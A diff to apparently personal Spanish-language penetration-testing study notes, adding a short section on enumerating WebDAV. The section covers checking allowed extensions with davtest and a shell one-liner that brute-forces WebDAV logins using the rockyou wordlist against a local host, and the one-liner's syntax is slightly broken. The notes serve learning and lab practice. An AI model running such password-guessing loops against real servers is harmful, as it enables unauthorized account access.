@@ -996,3 +996,13 @@ se puede hacer DDoS usando el redirect de otro servidor
 en el "harder" se puede url encondear el body post del request porque no permite usar puntos para la url
 
 # 22. enumeracion y explotacion de webDAV
+webDAV es un protocolo que permite guardar archivos, editarlos y compartirlos en un web server
+
+se puede usar **davtest** para verificar que extensiones se pueden usar con el servicio
+- davtest -url http://127.0.0.1 -auth admin:admin
+
+cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest --url http://127.0.0.1 -auth admin:\$password 2>&1) | grep -i suceed); if \[\$response]; then echo "la contrasena es $password"; break; fi ; done
+
+***cadaver*** es otra herramienta para entrar al webdav
+
+# 23. Enumeración y explotación de SQUID Proxies
